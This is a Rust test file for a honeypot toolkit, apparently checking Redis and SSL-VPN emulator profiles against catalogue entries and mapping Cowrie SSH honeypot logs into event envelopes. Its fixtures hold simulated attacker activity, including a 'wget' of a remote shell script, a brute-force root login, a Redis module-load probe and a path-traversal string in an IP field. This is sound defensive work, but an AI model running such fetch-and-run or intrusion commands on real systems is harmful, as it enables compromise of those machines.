//! Checks across the repository: profiles and manifests agree with their
//! catalogue entries, and the fingerprint smoke items (#18) recorded in the
//! profiles hold.

mod common;

use std::path::Path;

use foiled_core::capture::Channel;
use foiled_core::catalogue::{Artefact, CatalogueEntry, DecoyKind, EntryStatus};
use foiled_emulators::manifest::{MapError, ModuleManifest};
use foiled_emulators::profile::CheckResult;
use foiled_emulators::{Profile, Rng, http_portal, redis};
use serde_json::json;

fn catalogue_entry(id: &str) -> CatalogueEntry {
    let path = common::repo_root().join(format!("catalogue/entries/{id}.yaml"));
    let text = std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("{}: {e}", path.display()));
    serde_yaml_ng::from_str(&text).unwrap()
}

fn yaml_files(dir: &Path) -> Vec<std::path::PathBuf> {
    let mut out: Vec<_> = std::fs::read_dir(dir)
        .unwrap()
        .map(|e| e.unwrap().path())
        .filter(|p| p.extension().is_some_and(|e| e == "yaml"))
        .collect();
    out.sort();
    out
}

#[test]
fn every_profile_matches_its_directory_plugin_and_catalogue_entries() {
    let root = common::repo_root().join("emulators");
    let mut seen = 0;
    for dir in std::fs::read_dir(&root).unwrap() {
        let dir = dir.unwrap().path();
        let emulator_id = dir.file_name().unwrap().to_str().unwrap().to_string();
        for file in yaml_files(&dir.join("profiles")) {
            seen += 1;
            let p = Profile::load(&file).unwrap();
            let stem = file.file_stem().unwrap().to_str().unwrap();
            assert_eq!(p.id, stem, "{}", file.display());
            assert_eq!(p.emulator_id, emulator_id, "{}", file.display());
            assert!(
                p.problems().is_empty(),
                "{}: {:?}",
                file.display(),
                p.problems()
            );
            assert!(foiled_emulators::plugin(&p.plugin).is_some());
            assert_eq!(
                Profile::builtin(&p.id).as_ref(),
                Some(&p),
                "builtin copy is current"
            );
            for id in &p.catalogue_ids {
                let e = catalogue_entry(id);
                assert_eq!(e.decoy_kind, DecoyKind::Emulation);
                let Some(Artefact::Emulator(a)) = &e.artefact else {
                    panic!("{id} has no emulator artefact");
                };
                assert_eq!(a.emulator_id, p.emulator_id);
                assert_eq!(a.emulator_profile, p.id);
                for c in &p.claimed_cves {
                    assert!(
                        e.cves.iter().any(|x| x.cve_id == c.cve_id),
                        "{id} does not list claimed {}",
                        c.cve_id
                    );
                }
                for l in &p.listen {
                    assert!(e.listen_ports.iter().any(|x| x.port == l.port));
                }
            }
        }
    }
    assert_eq!(seen, 2);
    // Both example entries stay drafts until the staging audit passes.
    assert_eq!(
        catalogue_entry("emulator/redis/7.0").status,
        EntryStatus::Draft
    );
    assert_eq!(
        catalogue_entry("emulator/ssl-vpn/portal-generic").status,
        EntryStatus::Draft
    );
}

fn redis_core() -> redis::Core {
    let (sink, _rx) = common::sink("emulator/redis/7.0");
    redis::Core::new(&common::rendered("redis-7.0"), sink, &mut Rng::seeded(11)).unwrap()
}

fn field<'a>(info: &'a str, name: &str) -> &'a str {
    info.lines()
        .find_map(|l| l.strip_prefix(&format!("{name}:")))
        .unwrap_or_else(|| panic!("INFO has no {name}"))
}

/// The fingerprint items the Redis profile records as `pass`.
#[test]
fn redis_profile_passes_its_fingerprint_smoke_items() {
    let profile = common::rendered("redis-7.0");
    let passed: Vec<&str> = profile
        .fingerprint_checks
        .iter()
        .filter(|c| c.result == CheckResult::Pass)
        .map(|c| c.item.as_str())
        .collect();
    for item in ["FR-01", "FR-05", "FR-06", "FR-10", "FR-11", "FR-17"] {
        assert!(passed.contains(&item), "{item} not recorded as pass");
    }
    let core = redis_core();
    let info = core.info(&[], 6379);
    let entry = catalogue_entry("emulator/redis/7.0");

    // FR-01: no tool names in anything the service says.
    let mut conn = core.connect(6379);
    let mut said = info.clone();
    for cmd in [
        &["CONFIG", "GET", "*"][..],
        &["KEYS", "*"],
        &["NOPE"],
        &["MODULE", "LOAD", "/x.so"],
        &["AUTH", "x"],
    ] {
        let args: Vec<Vec<u8>> = cmd.iter().map(|s| s.as_bytes().to_vec()).collect();
        said.push_str(&String::from_utf8_lossy(
            &core.execute(&mut conn, &args).reply,
        ));
    }
    common::assert_no_tells(&said, "redis replies");

    // FR-05: the banner is exactly what the catalogue entry says.
    for hint in &entry.banner_hints {
        assert!(info.contains(&format!("{hint}\r\n")), "INFO lacks {hint}");
    }
    assert_eq!(field(&info, "redis_version"), entry.version);

    // FR-06: same OS story as the SSH persona that shares the host.
    let cowrie =
        ModuleManifest::load(&common::repo_root().join("modules/cowrie/manifest.yaml")).unwrap();
    let persona = &cowrie.personas[0];
    let kernel = &persona.settings["honeypot.kernel_version"];
    assert_eq!(field(&info, "os"), format!("Linux {kernel} x86_64"));
    assert!(persona.banners[0].contains("deb12"));
    assert_eq!(field(&info, "gcc_version"), "12.2.0", "Debian 12 toolchain");
    assert_eq!(field(&info, "executable"), "/usr/bin/redis-server");

    // FR-11: uptime is not a few seconds, and the clock is real.
    let up: u64 = field(&info, "uptime_in_seconds").parse().unwrap();
    assert!(up >= profile.redis.as_ref().unwrap().uptime_offset_s.min);
    assert_eq!(
        field(&info, "uptime_in_days").parse::<u64>().unwrap(),
        up / 86_400
    );
    let server_ms: i64 = field(&info, "server_time_usec").parse::<i64>().unwrap() / 1000;
    assert!((server_ms - common::now_ms()).abs() < 2_000);

    // FR-17: the shipped profile jitters by a few milliseconds.
    let shipped = Profile::builtin("redis-7.0").unwrap();
    assert!(shipped.jitter.max_ms > shipped.jitter.min_ms);
    assert!(shipped.jitter.max_ms <= 50);
}

#[test]
fn portal_profile_passes_its_fingerprint_smoke_items() {
    let profile = common::rendered("portal-generic");
    let entry = catalogue_entry("emulator/ssl-vpn/portal-generic");
    let http = profile.http.as_ref().unwrap();
    // FR-05: Server header and title are in the entry's banner hints.
    let server = format!("Server: {}", http.server_header.as_deref().unwrap());
    assert!(entry.banner_hints.contains(&server));
    assert!(
        http.routes
            .iter()
            .any(|r| r.body.contains(&entry.banner_hints[1]))
    );
    // FR-01: nothing served names a tool or a vendor.
    for body in http
        .routes
        .iter()
        .map(|r| &r.body)
        .chain(http.errors.iter().map(|e| &e.body))
    {
        common::assert_no_tells(body, "portal page");
    }
    // FR-10: the error pages scanners probe for exist.
    for s in http_portal::REQUIRED_ERRORS {
        assert!(http.errors.iter().any(|e| e.status == *s));
    }
}

fn cowrie() -> ModuleManifest {
    ModuleManifest::load(&common::repo_root().join("modules/cowrie/manifest.yaml")).unwrap()
}

#[test]
fn cowrie_manifest_agrees_with_its_catalogue_entry() {
    let m = cowrie();
    assert!(m.problems().is_empty(), "{:?}", m.problems());
    assert!(
        !m.is_pinned(),
        "placeholder digest must stay marked unpinned"
    );
    assert!(!m.is_gpl());
    for id in &m.catalogue_ids {
        let e = catalogue_entry(id);
        let Some(Artefact::Module(a)) = &e.artefact else {
            panic!("{id} has no module artefact");
        };
        assert_eq!(a.module_id, m.module_id);
        assert_eq!(a.licence, m.licence);
        let persona = m
            .personas
            .iter()
            .find(|p| p.id == a.module_profile)
            .expect("catalogue persona exists");
        for b in &persona.banners {
            assert!(e.banner_hints.contains(b), "banner {b} not in banner_hints");
        }
        // The draft entry cannot become verified with a placeholder digest.
        assert_eq!(e.status, EntryStatus::Draft);
    }
    let mut gpl = m.clone();
    gpl.licence = "GPL-3.0-only".into();
    assert!(gpl.problems().iter().any(|p| p.contains("source_offer")));
}

#[test]
fn cowrie_events_map_to_valid_envelopes() {
    let m = cowrie();
    let (sink, _rx) = common::sink("module/cowrie/2.6");
    let lines = [
        r#"{"eventid":"cowrie.session.connect","src_ip":"198.51.100.23","src_port":40001,"dst_ip":"10.85.1.3","dst_port":2222,"session":"a1b2c3d4","protocol":"ssh","timestamp":"2026-10-01T01:02:03.123456Z","sensor":"web-02"}"#,
        r#"{"eventid":"cowrie.login.failed","username":"root","password":"123456","src_ip":"198.51.100.23","session":"a1b2c3d4","timestamp":"2026-10-01T01:02:04.000000Z"}"#,
        r#"{"eventid":"cowrie.command.input","input":"uname -a; wget http://192.0.2.50/x.sh","src_ip":"198.51.100.23","session":"a1b2c3d4","timestamp":"2026-10-01T01:02:05.000000Z"}"#,
        r#"{"eventid":"cowrie.session.file_download","url":"http://192.0.2.50/x.sh","shasum":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08","outfile":"var/lib/cowrie/downloads/9f86","src_ip":"198.51.100.23","session":"a1b2c3d4","timestamp":"2026-10-01T01:02:06.000000Z"}"#,
        r#"{"eventid":"cowrie.direct-tcpip.request","dst_ip":"192.0.2.80","dst_port":25,"src_ip":"198.51.100.23","session":"a1b2c3d4","timestamp":"2026-10-01T01:02:07.000000Z"}"#,
    ];
    let mut events = Vec::new();
    for l in lines {
        events.push(m.map_line(l, &sink).unwrap().expect("mapped"));
    }
    common::assert_valid(&events);
    let channels: Vec<Channel> = events.iter().map(|e| e.channel).collect();
    assert_eq!(
        channels,
        [
            Channel::Network,
            Channel::Application,
            Channel::Application,
            Channel::Quarantine,
            Channel::Egress
        ]
    );
    assert_eq!(events[0].ts, 1_790_816_523_123);
    assert_eq!(events[0].src.port, Some(40001));
    assert_eq!(events[0].data["decoy_port"], json!(2222));
    assert_eq!(events[1].data["username"], json!("root"));
    assert_eq!(
        events[1].data["password_sha256"],
        json!("8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92")
    );
    assert!(
        !serde_json::to_string(&events[1])
            .unwrap()
            .contains("123456")
    );
    assert_eq!(
        events[2].data["command"],
        json!("uname -a; wget http://192.0.2.50/x.sh")
    );
    assert_eq!(events[3].data["sha256"].as_str().unwrap().len(), 64);
    assert!(
        !events[3].data.contains_key("outfile"),
        "container paths are not copied"
    );
    assert_eq!(events[4].data["target_port"], json!(25));
    assert!(
        events
            .iter()
            .all(|e| e.data["session"] == json!("a1b2c3d4"))
    );

    // Unmapped events are dropped; hostile lines are errors, never panics.
    assert_eq!(
        m.map_line(r#"{"eventid":"cowrie.client.size","src_ip":"198.51.100.23","timestamp":"2026-10-01T01:02:03Z"}"#, &sink),
        Ok(None)
    );
    assert_eq!(m.map_line("not json", &sink), Err(MapError::NotJson));
    assert!(matches!(
        m.map_line(&"x".repeat(70_000), &sink),
        Err(MapError::TooLong(_))
    ));
    assert!(matches!(
        m.map_line(r#"{"eventid":"cowrie.login.failed","src_ip":"../../etc","timestamp":"2026-10-01T01:02:03Z"}"#, &sink),
        Err(MapError::BadIp(_))
    ));
    let mut rng = Rng::seeded(77);
    for _ in 0..2000 {
        let len = rng.range(0, 300) as usize;
        let bytes: Vec<u8> = (0..len).map(|_| rng.next_u64() as u8).collect();
        let _ = m.map_line(&String::from_utf8_lossy(&bytes), &sink);
        let mut v = json!({"eventid": "cowrie.login.failed", "src_ip": "198.51.100.1", "timestamp": "2026-10-01T01:02:03Z"});
        v["username"] = json!(String::from_utf8_lossy(&bytes));
        v["password"] = json!(rng.next_u64());
        if let Ok(Some(ev)) = m.map_line(&v.to_string(), &sink) {
            common::assert_valid(&[ev]);
        }
    }
}
